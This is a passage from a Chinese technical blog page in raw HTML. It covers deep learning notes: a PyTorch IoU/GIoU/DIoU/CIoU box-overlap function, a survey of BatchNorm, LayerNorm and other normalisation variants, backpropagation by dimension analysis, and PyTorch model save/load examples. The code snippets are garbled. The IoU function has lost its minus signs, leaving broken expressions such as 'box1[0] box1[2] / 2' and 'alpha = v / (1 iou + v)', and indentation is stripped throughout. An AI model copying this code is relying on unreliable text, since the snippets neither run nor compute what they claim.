box1</span></span><br><span class="line">b1_x1, b1_x2 = box1[<span class="number">0</span>] box1[<span class="number">2</span>] / <span class="number">2</span>, box1[<span class="number">0</span>] + box1[<span class="number">2</span>] / <span class="number">2</span></span><br><span class="line">b1_y1, b1_y2 = box1[<span class="number">1</span>] box1[<span class="number">3</span>] / <span class="number">2</span>, box1[<span class="number">1</span>] + box1[<span class="number">3</span>] / <span class="number">2</span></span><br><span class="line">b2_x1, b2_x2 = box2[<span class="number">0</span>] box2[<span class="number">2</span>] / <span class="number">2</span>, box2[<span class="number">0</span>] + box2[<span class="number">2</span>] / <span class="number">2</span></span><br><span class="line">b2_y1, b2_y2 = box2[<span class="number">1</span>] box2[<span class="number">3</span>] / <span class="number">2</span>, box2[<span class="number">1</span>] + box2[<span class="number">3</span>] / <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Intersection area</span></span><br><span class="line">inter = (torch.<span class="built_in">min</span>(b1_x2, b2_x2) torch.<span class="built_in">max</span>(b1_x1, b2_x1)).clamp(<span class="number">0</span>) * \</span><br><span class="line">(torch.<span class="built_in">min</span>(b1_y2, b2_y2) torch.<span class="built_in">max</span>(b1_y1, b2_y1)).clamp(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Union Area</span></span><br><span class="line">w1, h1 = b1_x2 b1_x1, b1_y2 b1_y1</span><br><span class="line">w2, h2 = b2_x2 b2_x1, b2_y2 b2_y1</span><br><span class="line">union = (w1 * h1 + <span class="number">1e-16</span>) + w2 * h2 inter</span><br><span class="line">iou = inter / union  <span class="comment"># iou</span></span><br><span class="line"><span class="keyword">if</span> GIoU <span class="keyword">or</span> DIoU <span class="keyword">or</span> CIoU:</span><br><span class="line">cw = torch.<span class="built_in">max</span>(b1_x2, b2_x2) torch.<span class="built_in">min</span>(b1_x1, b2_x1)  <span class="comment"># convex (smallest enclosing box) width</span></span><br><span class="line">ch = torch.<span class="built_in">max</span>(b1_y2, b2_y2) torch.<span class="built_in">min</span>(b1_y1, b2_y1)  <span class="comment"># convex height</span></span><br><span class="line"><span class="keyword">if</span> GIoU:  <span class="comment"># Generalized IoU https://arxiv.org/pdf/1902.09630.pdf</span></span><br><span class="line">c_area = cw * ch + <span class="number">1e-16</span>  <span class="comment"># convex area</span></span><br><span class="line"><span class="keyword">return</span> iou (c_area union) / c_area  <span class="comment"># GIoU</span></span><br><span class="line"><span class="keyword">if</span> DIoU <span class="keyword">or</span> CIoU:  <span class="comment"># Distance or Complete IoU https://arxiv.org/abs/1911.08287v1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># convex diagonal squared</span></span><br><span class="line">c2 = cw ** <span class="number">2</span> + ch ** <span class="number">2</span> + <span class="number">1e-16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># centerpoint distance squared</span></span><br><span class="line">rho2 = ((b2_x1 + b2_x2) (b1_x1 + b1_x2)) ** <span class="number">2</span> / <span class="number">4</span> + ((b2_y1 + b2_y2) (b1_y1 + b1_y2)) ** <span class="number">2</span> / <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> DIoU:</span><br><span class="line"><span class="keyword">return</span> iou rho2 / c2  <span class="comment"># DIoU</span></span><br><span class="line"><span class="keyword">elif</span> CIoU:  <span class="comment"># https://github.com/Zzh-tju/DIoU-SSD-pytorch/blob/master/utils/box/box_utils.py#L47</span></span><br><span class="line">v = (<span class="number">4</span> / math.pi ** <span class="number">2</span>) * torch.<span class="built_in">pow</span>(torch.atan(w2 / h2) torch.atan(w1 / h1), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">alpha = v / (<span class="number">1</span> iou + v)</span><br><span class="line"><span class="keyword">return</span> iou (rho2 / c2 + v * alpha)  <span class="comment"># CIoU</span></span><br><span class="line"><span class="keyword">return</span> iou</span><br></pre></td></tr></table></figure><h2 id="正则化，规范化"><a href="#正则化，规范化" class="headerlink" title="正则化，规范化"></a>正则化，规范化</h2><p>在卷积操作中，经常会使用到BN操作，由于卷积操作其实也是数据在不同维度投影的操作。这个时候，如果执行从高维到低维的投影，若数据其中某一特征的数值特别大的话，那么它在整个误差计算的比重上就很大。所以将数据投影到低维空间之后，整个投影会去努力逼近数值最大的那一个特征，而忽略数值比较小的特征。<br>为了“公平”起见，防止过分捕捉某些数值大的特征，我们就可以先对每个特征先进行标准化处理，使得它们的大小都在相同的范围内。</p><h3 id="standardization"><a href="#standardization" class="headerlink" title="standardization"></a>standardization</h3><p>标准化，将训练集中某一列数值特征的值缩放成均值为0，方差为1的状态。</p><h3 id="Normalization"><a href="#Normalization" class="headerlink" title="Normalization"></a>Normalization</h3><p>归一化，将训练集中某一列数值特征的值缩放到0和1之间。</p><h2 id="池化"><a href="#池化" class="headerlink" title="池化"></a>池化</h2><h2 id="平移不变性"><a href="#平移不变性" class="headerlink" title="平移不变性"></a>平移不变性</h2><h2 id="自定义OP"><a href="#自定义OP" class="headerlink" title="自定义OP"></a>自定义OP</h2><p>流程：</p><ol><li>注册OP</li><li>实现OP</li><li>创建python接口</li><li>实现OP梯度计算（不需要求导可以直接pass）</li></ol><h2 id="统计参数量"><a href="#统计参数量" class="headerlink" title="统计参数量"></a>统计参数量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total_params = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> params <span class="keyword">in</span> self.model.parameters():</span><br><span class="line">num_params = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> params.size():</span><br><span class="line">num_params *= x</span><br><span class="line">total_params += num_params</span><br></pre></td></tr></table></figure><h2 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h2><p>由于神经网络中求梯度的时候，直接对矩阵进行十分复杂，但是所有的矩阵对矩阵的导数都是可以通过间接的方法，利用求标量导数的那些知识轻松求出来的。而这种间接求导数的方法就是维度分析。<br>通过维度分析和链式法则简化求导过程。</p><h3 id="维度分析"><a href="#维度分析" class="headerlink" title="维度分析"></a>维度分析</h3><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><p>设某一层的Forward Pass为score&#x3D;XW + b,,<strong>X</strong>是<strong>NxD</strong>的矩阵，<strong>W</strong>是<strong>DxC</strong>的矩阵，b是1xC的矩阵，那么<strong>score</strong>就是一个<strong>NxC</strong>的矩阵。现在上层已经告诉你L对score的导数是多少了，我们求L对W和b的导数。</p><h5 id="求解"><a href="#求解" class="headerlink" title="求解"></a>求解</h5><p>首先<strong>Loss是一个标量</strong>，$\frac{dL}{dscore}$一定是一个<strong>NxC</strong>的矩阵，L对W的导数就就表示为：<br>$$<br>\frac{dL}{dW}&#x3D;\frac{dL}{dscore}\frac{dscore}{dW}<br>$$<br>这里score和W都是矩阵，直接进行矩阵对矩阵的求导复杂。</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>其实我们没有必要直接求score对W的导数，我们可以利用另外两个导数间接地把<br>$\frac{dscore}{dW}$算出来。首先来看看它的形状。我们知道$\frac{dL}{dW}$一定是DxC的(形状和W一致)，而$\frac{dL}{dscore}$是NxC的，所以$\frac{dscore}{dW}$一定是DxN的，因为(DxN)x(NxC)→(DxC),按计算可以看出，求导公式的正式写法应该是：$\frac{dL}{dW}&#x3D;\frac{dscore}{dW}\frac{dL}{dscore}$。<br>既然$score&#x3D;XW+b$，如果都是标量的话，score对W求导，本身就是X；X是NxD的，所以我们需要DxN的形状的数据，顺其自然我们只需要转置一下就可以得到：<br>$$<br>\frac{dL}{dW}&#x3D;X^T\frac{dL}{dscore}<br>$$<br>完事。<br>这样就避免了直接去用$\frac{dscore_{11}}{dW_{11}}$这种细枝末节的一个一个元素求导的方式推导$\frac{dscore}{dW}$,这就是神经网络种求取导数的正确姿势。</p><blockquote><p>实现的关键在于Loss是一个标量，而标量对一个矩阵求导，其大小和这个矩阵的大小永远是一样的。</p></blockquote><h3 id="链式法则"><a href="#链式法则" class="headerlink" title="链式法则"></a>链式法则</h3><blockquote><p>链式法则在神经网络中十分重要！</p></blockquote><h2 id="BN集合"><a href="#BN集合" class="headerlink" title="BN集合"></a>BN集合</h2><p>BN依据不同的方式有多种不同的形式</p><h3 id="traditional-BN"><a href="#traditional-BN" class="headerlink" title="traditional BN"></a>traditional BN</h3><p>[[BN]]</p><blockquote><p>BatchNorm是针对单个神经元进行的，利用网络训练时一个 mini-batch 的数据来计算该神经元的均值和方差。所以对Batch有强依赖。CxHxW相当于有CxHxW这么多个神经元。</p></blockquote><p>步骤：</p><ol><li>计算&#x2F;更新均值</li><li>计算&#x2F;更新方差</li><li>使用均值和方差对每个元素标准化</li><li>BN的可学习参数就是线性变化</li></ol><h3 id="统计对象的魔改"><a href="#统计对象的魔改" class="headerlink" title="统计对象的魔改"></a>统计对象的魔改</h3><h4 id="Layer-Normization"><a href="#Layer-Normization" class="headerlink" title="Layer Normization"></a>Layer Normization</h4><p>计算<strong>C H W</strong>上的均值和方差，这样的归一化方式，使 batch 中的每个样本均可利用其<strong>本身的数据</strong>的进行归一化操作。<br>更<strong>高效方便</strong>，也不存在更新均值和方差时，batch 内均值和方差不稳定的问题。<br>在 <strong>NLP</strong> 中（Transformer）比较常用，CNN 上作用不大，但是随着Transformer的跨界，LN和MLP的组合变得十分常见。</p><h4 id="Instance-Normization"><a href="#Instance-Normization" class="headerlink" title="Instance Normization"></a>Instance Normization</h4><p>计算 (<strong>H, W</strong>) 上的均值和方差，作用于每个样本的每个通道上的归一化方法<br>由于其计算均值和方差的粒度较细，在 low-level 的任务中（例如风格迁移）通常表现突出。在 GAN 网络的生成器中使用，IN 会降低生成图像中的网格感，使其更加自然。</p><h4 id="Group-Normization"><a href="#Group-Normization" class="headerlink" title="Group Normization"></a>Group Normization</h4><p>LN和IN的均衡操作。<br>在<strong>一定数目的 channel</strong> 上进行归一化（即计算 <strong>(c, H, W)</strong> 上的均值和方差）。当 batch size 小于 8 的时候，通常使用 Group Normalization 代替 Batch Normalization，对训练好的模型 fineture，效果还不错。</p><h4 id="Switchable-Normalization"><a href="#Switchable-Normalization" class="headerlink" title="Switchable Normalization"></a>Switchable Normalization</h4><p>BN、LN、IN按一定的比例加权组合，权重系数通过网络学习。<br>速度慢。</p><h4 id="Sync-Batch-Normalization"><a href="#Sync-Batch-Normalization" class="headerlink" title="Sync Batch Normalization"></a><a href="https://github.com/chrisway613/Synchronized-BatchNormalization">Sync Batch Normalization</a></h4><p>跨卡实现同步BN操作，SN 能够帮助我们屏蔽多卡训练的分布式细节，将分散在每个 GPU 上的 batch 合并，视为一个机器上的一个 batch。<br>其关键是在前向运算的时候，计算并同步全局（所有 GPU 上 batch）的均值和方差；在反向运算时候，同步相应的全局梯度。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h6 id="2次同步"><a href="#2次同步" class="headerlink" title="2次同步"></a>2次同步</h6><p>先同步各卡的均值，计算出全局的均值，然后同步给各卡，接着各卡同步计算方差。<br><strong>缺点</strong>：消耗资源，且影响训练速度。</p><h6 id="１次同步"><a href="#１次同步" class="headerlink" title="１次同步"></a>１次同步</h6><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649997819467_0.png" alt="image.png"><br>其中ｍ为各卡拿到的数据批次大小$(\frac{batch*size}{nGPU})$。<br>由上可知，<strong>每张</strong>卡计算出$\sum_{i&#x3D;1}^{m}X_i$和$\sum_{i&#x3D;1}^{m}x_i^2$，然后进行求和，即可计算出<strong>全局的方差</strong>，同时，全局的均值可通过<strong>各卡</strong>的$\sum_{i&#x3D;1}^{m}x_i$同步求和得到，一次同步就可实现全局均值和方差的计算。<br>关键在于重载 [[replicate]] 方法，<strong>原生的该方法只是将模型在每张卡上复制一份</strong>，并且没有建立起联系，而我们的 <strong>SyncBN 是需要进行同步</strong>的，因此需要重载该方法，让各张卡上的SyncBN 通过某种数据结构和同步机制建立起联系。</p><h4 id="Sparse-Switchable-Normalization"><a href="#Sparse-Switchable-Normalization" class="headerlink" title="Sparse Switchable Normalization"></a>Sparse Switchable Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649998746111_0.png" alt="image.png"><br>Switchable Normalization 的改进版。通过稀疏约束，使用 sparsestmax 替代了 softmax，在保持性能的同时减少了 switchable 的计算量，增加了鲁棒性。</p><h4 id="Region-Normalization"><a href="#Region-Normalization" class="headerlink" title="Region Normalization"></a>Region Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649998810544_0.png" alt="image.png"><br>Region Normalization 在 Batch Normalization 的基础上进一步对 (N, H, W) 中的 (H, W) 进行了划分。Region Normalization 根据输入掩码将空间像素划分为不同的区域，并计算每个区域的均值和方差以进行归一化。实现时只需将输入先进行 mask，再输入 BN 即可。</p><h4 id="Local-Context-Normalization"><a href="#Local-Context-Normalization" class="headerlink" title="Local Context Normalization"></a>Local Context Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999016347_0.png" alt="image.png"><br>Local Context Normalization 在 Layer Normalization 的基础上对 (C, H, W) 进行了划分。Local Context Normalization 根据每个特征值所在的局部邻域，计算邻域的均值和方差以进行归一化。实现时作者借助了空洞卷积获取 window 内均值和方差，比较巧妙。</p><h4 id="Channel-Normalization"><a href="#Channel-Normalization" class="headerlink" title="Channel Normalization"></a>Channel Normalization</h4><p>在 channel 维度求统计量，对 tensor 进行归一化。</p><h4 id="Domain-Specific-Batch-Normalization"><a href="#Domain-Specific-Batch-Normalization" class="headerlink" title="Domain-Specific Batch Normalization"></a>Domain-Specific Batch Normalization</h4><p>Domain-Specific Batch Normalization 与 Split Batch Normalization 类似，都针对 sample 的不同进行了分组。不同的是，在 Domain adaptation 任务中，Domain-Specific Batch Normalization 选择对 source domain 和 target domain 进行分组。在计算时，干脆创建了两个 Batch Normalization，根据 domain 选择相应的分支输入。</p><h3 id="规范化方式的魔改"><a href="#规范化方式的魔改" class="headerlink" title="规范化方式的魔改"></a>规范化方式的魔改</h3><h4 id="Filter-Response-Normalization"><a href="#Filter-Response-Normalization" class="headerlink" title="Filter Response Normalization"></a>Filter Response Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999050127_0.png" alt="image.png"><br>对Instance Normalization的改进。在 (H, W) 维度上计算统计量。不同的是，Filter Response Normalization 并不计算平均值，在规范化的过程中，直接使用每个元素除以 (H, W) 维度二范数的平均值。由于缺少减去均值的操作，因此归一化的结果可能会产生偏移（不以 0 为中心），这对于后续的 ReLU 激活是不利的。因此，作者还提出了配套的激活函数 TLU。（其实 TLU 单独使用也挺好用的）</p><h4 id="Extended-Batch-Normalization"><a href="#Extended-Batch-Normalization" class="headerlink" title="Extended Batch Normalization"></a>Extended Batch Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999073532_0.png" alt="image.png"><br>Extended Batch Normalization 改进了 Batch Normalization。虽然仍使用均值和方差进行规范化，不同之处在于，Extended Batch Normalization 在 (N, H, W) 的维度上求平均值，在 (N, C, H, W) 的维度上求方差。直观上看，统计元素数量的增多使得方差更为稳定，因而能够在小 batch 上取得较好的效果。</p><h4 id="Kalman-Normalization"><a href="#Kalman-Normalization" class="headerlink" title="Kalman Normalization"></a>Kalman Normalization</h4><p>Kalman Normalization 改进了 Batch Normalization，使得不同层之间的统计量得以相互关联。在 Kalman Normalization，当前归一化层的均值和方差是通过和上一个归一化层的均值和方差进行卡尔曼滤波得到的（可以简单理解当前状态为加权历史状态），其在大尺度物体检测和风格任务上都取得了较好的效果。</p><h4 id="L1-Norm-Batch-Normalization"><a href="#L1-Norm-Batch-Normalization" class="headerlink" title="L1-Norm Batch Normalization"></a>L1-Norm Batch Normalization</h4><p>L1-Norm Batch Normalization 将 Batch Normalization 中的求方差换成了 L1 范数。在 GAN 中表现出了较好的效果。</p><h4 id="Cosine-Normalization"><a href="#Cosine-Normalization" class="headerlink" title="Cosine Normalization"></a>Cosine Normalization</h4><p>提出使用 cosine similarity 进行归一化。</p><h3 id="仿射变换方式的魔改"><a href="#仿射变换方式的魔改" class="headerlink" title="仿射变换方式的魔改"></a>仿射变换方式的魔改</h3><p>仿射变换的方式给人的感觉就是将BN也往网络上改。</p><h4 id="Conditional-Batch-x2F-Instance-Normalization"><a href="#Conditional-Batch-x2F-Instance-Normalization" class="headerlink" title="Conditional Batch&#x2F;Instance Normalization"></a>Conditional Batch&#x2F;Instance Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999153042_0.png" alt="image.png"><br>Conditional Batch Normalization 在 Batch Normalization 的基础上改进了仿射变换的部分。它使用 LSTM 和多层感知器，将自然语言映射为一组特征向量，作为仿射变换的权重 γ 和偏置 β 引导后续任务。Conditional Instance Normalization 则是对 style 信息进行编码，使用在风格迁移中（正如之前所介绍的，Instance Normalization 在 low-level 任务中更有优势）。笔者认为，二者都可以看作使用 attention 机制引入了外部信息。</p><h4 id="Adaptive-Instance-Normalization"><a href="#Adaptive-Instance-Normalization" class="headerlink" title="Adaptive Instance Normalization"></a>Adaptive Instance Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999171443_0.png" alt="image.png"><br>Adaptive Instance Normalization 进一步放宽了权重 γ 和偏置 β 在风格迁移中的估计方法。作者提出的方法不再需要一个单独的 style 特征提取模块，对于给定的风格图像和原始图像都使用相同的 backbone （VGG）提取特征，用风格图像算出权重 γ 和偏置 β ，用于原始图像的仿射变换中。</p><h4 id="Adaptive-Convolution-based-Normalization"><a href="#Adaptive-Convolution-based-Normalization" class="headerlink" title="Adaptive Convolution-based Normalization"></a>Adaptive Convolution-based Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999194065_0.png" alt="image.png"><br>Adaptive Convolution-based Normalization 是 Adaptive Instance Normalization 的改良版。不同之处在于，Adaptive Convolution-based Normalization 在仿射变换的过程中，使用一个动态的卷积层完成。这时的仿射变换已经漏出了卷积的獠牙，传统意义上的仿射变换名存实亡。</p><h4 id="Spatially-Adaptive-Normalization"><a href="#Spatially-Adaptive-Normalization" class="headerlink" title="Spatially-Adaptive Normalization"></a>Spatially-Adaptive Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999215139_0.png" alt="image.png"><br>Spatially-Adaptive Normalization 在使用均值和方差将每个元素标准化到 [0,1] 后，在仿射变换层融入了 mask 引导的 attention 机制。作者首先使用卷积层对 mask 进行变换，在得到的 feature map 上分别使用两个卷积层得到权重 γ 和偏置 β 的估计。最后使用权重 γ 和偏置 β 的估计对归一化的结果进行 element-wise 的乘加操作，完成归一化。</p><h4 id="Region-Adaptive-Normalization"><a href="#Region-Adaptive-Normalization" class="headerlink" title="Region-Adaptive Normalization"></a>Region-Adaptive Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999235742_0.png" alt="image.png"><br>Region-Adaptive Normalization 在 Spatially-Adaptive Normalization 的基础上进行了 style map 和 segmentation mask 两个 branch 的 fusion。分别使用 style map 和 mask 套用 Spatially-Adaptive Normalization 得到权重 γ 和偏置 β 的估计，再将两个 branch 的估计加权平均，得到最终的估计。而后进行仿射变换完成归一化。</p><h4 id="Instance-Enhancement-Batch-Normalization"><a href="#Instance-Enhancement-Batch-Normalization" class="headerlink" title="Instance Enhancement Batch Normalization"></a>Instance Enhancement Batch Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999254700_0.png" alt="image.png"><br>Instance Enhancement Batch Normalization 对权重 γ 的估计则更为简单粗暴。在使用时，不需要引入 mask 等额外信息做引导，由网络自适应地学习。作者借鉴了 SENet 的思路，通过池化、变换、Sigmoid 得到一组权重 γ 。这使得 Instance Enhancement Batch Normalization 具有很强的通用性，尽管参数量有所提升，但是即插即用无痛涨点。</p><h4 id="Attentive-Normalization"><a href="#Attentive-Normalization" class="headerlink" title="Attentive Normalization"></a>Attentive Normalization</h4><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649999273235_0.png" alt="image.png"><br>Attentive Normalization 与 Instance Enhancement Batch Normalization 的方法类似。笔者认为 Attentive Normalization 这个名称似乎更加形象一些。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="保存加载模型"><a href="#保存加载模型" class="headerlink" title="保存加载模型"></a>保存加载模型</h2><h3 id="保存加载模型基本用法"><a href="#保存加载模型基本用法" class="headerlink" title="保存加载模型基本用法"></a>保存加载模型基本用法</h3><h4 id="整个模型"><a href="#整个模型" class="headerlink" title="整个模型"></a>整个模型</h4><p>保存整个网络模型（<strong>网络结构+权重参数</strong>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.save(model, <span class="string">&#x27;net.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure><p>直接加载<strong>整个网络模型</strong>（可能比较耗时）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model = torch.load(<span class="string">&#x27;net.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="只针对模型参数"><a href="#只针对模型参数" class="headerlink" title="只针对模型参数"></a>只针对模型参数</h4><p>只保存模型的权重参数（速度快，占内存少）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.save(model.state_dict(), <span class="string">&#x27;net_params.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure><p>因为我们只保存了模型的参数，所以需要先定义一个网络对象，然后再加载模型参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 构建一个网络结构</span></span><br><span class="line">model = ClassNet()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模型参数加载到新模型中</span></span><br><span class="line">state_dict = torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>)</span><br><span class="line">model.load_state_dict(state_dict)</span><br></pre></td></tr></table></figure><h3 id="加载部分参数"><a href="#加载部分参数" class="headerlink" title="加载部分参数"></a>加载部分参数</h3><p>模型微调操作，能够满足模型的按需加载操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pretrained_dict = torch.load(<span class="string">&#x27;net_params.pkl&#x27;</span>)<span class="comment">#加载模型</span></span><br><span class="line">net = Net()<span class="comment"># 获取模型</span></span><br><span class="line">net_state_dict = net.state_dict()<span class="comment">#获取模型的权重字典</span></span><br><span class="line">pretrained_dict_1 = &#123;k:v <span class="keyword">for</span> k,v <span class="keyword">in</span> pretrained_dict.items() <span class="keyword">if</span> k <span class="keyword">in</span> net_state_dict&#125;<span class="comment">#将pretrained_dict里不属于net_state_dict的键剔除掉</span></span><br><span class="line">net_state_dict.update(pretrained_dict_1)<span class="comment">#使用筛选后的字典对模型参数进行更新</span></span><br><span class="line">net.load_state_dict(net_state_dict)<span class="comment"># 将更新后的参数字典“放”回网络中</span></span><br></pre></td></tr></table></figure><h3 id="pkl文件"><a href="#pkl文件" class="headerlink" title="pkl文件"></a>pkl文件</h3><p>保存加载的 net.pkl 其实一个字典，通常包含如下内容：</p><ol><li><strong>网络结构</strong>：输入尺寸、输出尺寸以及隐藏层信息，以便能够在加载时重建模型。</li><li><strong>模型的权重参数</strong>：包含各网络层训练后的可学习参数，可以在模型实例上调用 <code>state_dict()</code> 方法来获取，比如前面介绍只保存模型权重参数时用到的 <code>model.state_dict()</code>。</li><li><strong>优化器参数</strong>：有时保存模型的参数需要稍后接着训练，那么就必须保存优化器的状态和所其使用的超参数，也是在优化器实例上调用 <code>state_dict()</code> 方法来获取这些参数。</li><li>其他信息：有时我们需要保存一些其他的信息，比如 <code>epoch</code>，<code>batch_size</code> 等超参数。</li></ol><h3 id="自定义模型"><a href="#自定义模型" class="headerlink" title="自定义模型"></a>自定义模型</h3><h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><p>通过pkl文件格式，我们就可以自定义需要保存的内容，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># saving a checkpoint assuming the network class named ClassNet</span></span><br><span class="line">checkpoint = &#123;<span class="string">&#x27;model&#x27;</span>: ClassNet(),</span><br><span class="line"><span class="string">&#x27;model_state_dict&#x27;</span>: model.state_dict(),</span><br><span class="line"><span class="string">&#x27;optimizer_state_dict&#x27;</span>: optimizer.state_dict(),</span><br><span class="line"><span class="string">&#x27;epoch&#x27;</span>: epoch&#125;</span><br><span class="line">torch.save(checkpoint, <span class="string">&#x27;checkpoint.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>上面的 checkpoint 是个字典，里面有4个键值对，分别表示网络模型的不同信息。</strong></p><h4 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_checkpoint</span>(<span class="params">filepath</span>):</span><br><span class="line">checkpoint = torch.load(filepath)</span><br><span class="line">model = checkpoint[<span class="string">&#x27;model&#x27;</span>]  <span class="comment"># 提取网络结构</span></span><br><span class="line">model.load_state_dict(checkpoint[<span class="string">&#x27;model_state_dict&#x27;</span>])  <span class="comment"># 加载网络权重参数</span></span><br><span class="line">optimizer = TheOptimizerClass()</span><br><span class="line">optimizer.load_state_dict(checkpoint[<span class="string">&#x27;optimizer_state_dict&#x27;</span>])  <span class="comment"># 加载优化器参数</span></span><br><span class="line"><span class="keyword">for</span> parameter <span class="keyword">in</span> model.parameters():</span><br><span class="line">parameter.requires_grad = <span class="literal">False</span></span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="keyword">return</span> model</span><br><span class="line">model = load_checkpoint(<span class="string">&#x27;checkpoint.pkl&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>如果加载模型只是为了进行推理测试，则将每一层的 requires_grad 置为 False，即固定这些权重参数；还需要调用 model.eval() 将模型置为测试模式，主要是将 dropout 和 batch normalization 层进行固定，否则模型的预测结果每次都会不同。</p></blockquote><blockquote></blockquote><p>如果希望继续训练，则调用 model.train()，以确保网络模型处于训练模式。</p><h3 id="state-dict"><a href="#state-dict" class="headerlink" title="state_dict"></a>state_dict</h3><blockquote><p>state_dict() 也是一个Python字典对象，model.state_dict() 将每一层的可学习参数映射为参数矩阵，其中只包含具有可学习参数的层(卷积层、全连接层等)。</p></blockquote><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Define model</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TheModelClass</span>(nn.Module):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">super</span>(TheModelClass, self).__init__()</span><br><span class="line">self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>)</span><br><span class="line">self.bn = nn.BatchNorm2d(<span class="number">8</span>)</span><br><span class="line">self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>)</span><br><span class="line">self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">self.fc1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">10</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">x = self.bn(x)</span><br><span class="line">x = 